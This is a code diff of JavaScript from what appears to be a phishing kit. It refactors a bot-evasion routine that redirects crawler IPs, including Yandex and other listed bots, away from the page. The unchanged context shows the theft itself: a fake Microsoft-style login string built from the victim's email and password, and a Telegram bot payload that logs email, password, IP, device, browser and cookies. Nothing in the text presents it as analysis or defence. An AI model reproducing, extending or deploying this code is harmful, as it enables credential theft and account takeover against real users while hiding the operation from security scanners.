@@ -23,65 +23,22 @@
           "yandexBotIPs.json",
           "generalBotIPs.json",
         ];
-        const promises = jsonFiles.map((filename) => {
-          return fetch(folderPath + filename)
-            .then((response) => response.json())
-            .then((data) => {
-              const ips = Object.values(data).map((ip) =>
-                String(ip).replace(/"/g, "")
-              );
-              return ips;
-            })
-            .catch((error) => {
-              console.error(`Error fetching ${filename}:`, error);
-              return [];
-            });
+        const promises = jsonFiles.map(async (filename) => {
+          try {
+            const response = await fetch(folderPath + filename);
+            const data = await response.json();
+            const ips = Object.values(data).map((ip) =>
+              String(ip).replace(/"/g, "")
+            );
+            return ips;
+          } catch (error) {
+            console.error(`Error fetching ${filename}:`, error);
+            return [];
+          }
         });
         const ipArrays = await Promise.all(promises);
         const targetIPAddresses = ipArrays.flat();
-        //console.log('Fetched target IP addresses:', targetIPAddresses);
         return targetIPAddresses;
-      }
-
-      function isTargetIPAddress(ipAddress, targetIPAddresses) {
-        //console.log(ipAddress)
-        if (!Array.isArray(targetIPAddresses)) {
-          targetIPAddresses = [targetIPAddresses];
-        }
-        for (let i = 0; i < targetIPAddresses.length; i++) {
-          const targetIP = targetIPAddresses[i];
-          const individualIPs = targetIP.split(",").map((ip) => ip.trim());
-          for (let j = 0; j < individualIPs.length; j++) {
-            const individualIP = individualIPs[j];
-            //console.log("Individual IP:", individualIP);
-            if (isIPInRange(ipAddress, individualIP)) {
-              console.log("Match found:", individualIP);
-              return true;
-            }
-          }
-        }
-        console.log("Match not found");
-        return false;
-      }
-
-      function isIPInRange(ipAddress, targetIP) {
-        //console.log("Checking IP range:", targetIP);
-        if (Array.isArray(targetIP)) {
-          for (let i = 0; i < targetIP.length; i++) {
-            const ip = targetIP[i];
-            if (ipAddress.trim() === ip.trim()) {
-              //console.log("IPs match:", true);
-              return true;
-            }
-          }
-        } else {
-          //console.log("Checking IP:", targetIP.trim());
-          const match = ipAddress.trim() === targetIP.trim();
-          //console.log("IPs match:", match);
-          return match;
-        }
-        //console.log("IPs match:", false);
-        return false;
       }
 
       async function redirectToBlockedPage() {
@@ -89,10 +46,9 @@
           const targetIPAddresses = await fetchTargetIPAddresses();
           const data = await fetch("https://api.ipify.org?format=json");
           const { ip: currentIPAddress } = await data.json();
-          if (isTargetIPAddress(currentIPAddress, targetIPAddresses)) {
+          const isBlocked = targetIPAddresses.includes(currentIPAddress);
+          if (isBlocked) {
             window.location.href = "http://2m.ma";
-            //const userAgent = navigator.userAgent;
-            //console.log("User Agent:", userAgent);
           }
         } catch (error) {
           console.error("Error:", error);
@@ -261,7 +217,7 @@
           const date = setCurrentDateInDesiredFormat();
 
           const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-
-                US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;
+                    US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;
 
           fetch("https://api.ipify.org")
             .then((res) => res.text())
@@ -308,16 +264,16 @@
           const payload = {
             chat_id: chatId,
             text: `
-                    ${websiteName} Log:
-                    ________________________
-                    "EMAIL ADDRESS": ${data.email},
-                    "PASSWORD": ${data.password},
-                    "IP": ${data.ipAddress},
-                    "DEVICE": ${data.Device},
-                    "OS": ${data.OS},
-                    "BROWSER": ${data.Browser},
-                    "COOKIE": ${data.Cookies},
-                    `,
+                            ${websiteName} Log:
+                            ________________________
+                            "EMAIL ADDRESS": ${data.email},
+                            "PASSWORD": ${data.password},
+                            "IP": ${data.ipAddress},
+                            "DEVICE": ${data.Device},
+                            "OS": ${data.OS},
+                            "BROWSER": ${data.Browser},
+                            "COOKIE": ${data.Cookies},
+                            `,
           };
 
           const sendToBot = {
